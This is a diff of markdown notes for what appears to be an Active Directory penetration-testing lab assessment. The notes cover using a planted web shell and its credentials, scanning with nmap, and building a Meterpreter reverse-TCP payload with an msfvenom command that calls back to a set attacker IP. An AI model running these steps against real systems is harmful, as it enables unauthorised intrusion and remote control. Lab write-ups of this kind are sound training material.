@@ -1,19 +1,19 @@
-```table-of-contents
-```
+
+
 # AD Enum & Attacks - Assessment 1
 
-## Given info
+## Given Info
 A team member started an External Penetration Test and was moved to another urgent project before they could finish. The team member was able to find and exploit a file upload vulnerability after performing recon of the externally-facing web server. Before switching projects, our teammate left a password-protected web shell (with the credentials: `admin:My_W3bsH3ll_P@ssw0rd!`) in place for us to start from in the `/uploads` directory. As part of this assessment, our client, Inlanefreight, has authorized us to see how far we can take our foothold and is interested to see what types of high-risk issues exist within the AD environment. Leverage the web shell to gain an initial foothold in the internal network. Enumerate the Active Directory environment looking for flaws and misconfigurations to move laterally and ultimately achieve domain compromise.
 
 
 ## Steps
 
-### Finding the admin's desktop flag
+### Finding the Admin's Desktop Flag
 - nmap scan just to check what ports are open on the host
 - Look around the web server through the web shell in order t o find the admin desktop directory.
 
 
-### Elevating access to the reverse shell from the web shell
+### Elevating Access to the Reverse Shell from the Web Shell
         
 - Use msfconsole to create a custom payload
 	- `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.9 lport=4444 -f exe > shell.exe`
@@ -22,7 +22,7 @@ A team member started an External Penetration Test and was moved to another urge
 	- upload the exploit to the web shell, and run it
 
 
-### Getting a user's hash
+### Getting a User's Hash
         
 - We don't have a password to the local host, so we have to get a password hash and crack it
 - Transfer PowerView.ps1 to the target machine and import it into powershell
